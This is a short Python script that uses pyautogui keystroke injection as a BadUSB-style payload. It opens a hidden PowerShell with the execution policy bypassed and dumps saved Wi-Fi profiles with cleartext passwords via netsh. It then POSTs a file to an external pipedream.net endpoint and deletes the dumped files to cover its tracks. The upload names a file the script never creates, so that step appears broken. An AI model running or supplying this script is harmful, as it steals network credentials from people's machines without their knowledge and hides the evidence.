import pyautogui

# access to powershell
pyautogui.keyDown('win')
pyautogui.keyDown('r')
pyautogui.keyUp('win')
pyautogui.keyUp('r')
pyautogui.write('powershell -w hidden -nop -ep bypass')
pyautogui.press('enter')
pyautogui.time.sleep(2)

# go to temp directory
pyautogui.write('cmd')
pyautogui.press('enter')
pyautogui.write('cd %temp%')
pyautogui.press('enter')

# copy wlan data
pyautogui.write('netsh wlan show profile > List-Wifi.txt')
pyautogui.press('enter')
pyautogui.time.sleep(2)

# export wlan data
pyautogui.write('netsh wlan show profile name=* key=clear > Pass-Wifi.txt')
pyautogui.press('enter')

# post data
pyautogui.write(
    'powershell Invoke-WebRequest -Uri https://eo7mznr16o63auf.m.pipedream.net -Method POST -InFile Wi-Fi-PASS -UseBasicParsing')
pyautogui.press('enter')
pyautogui.time.sleep(2)

# clear files
pyautogui.write('del Wi-* /s /f /q')

# exit

pyautogui.write('exit')
pyautogui.press('enter')
pyautogui.write('exit')
pyautogui.press('enter')


# Done
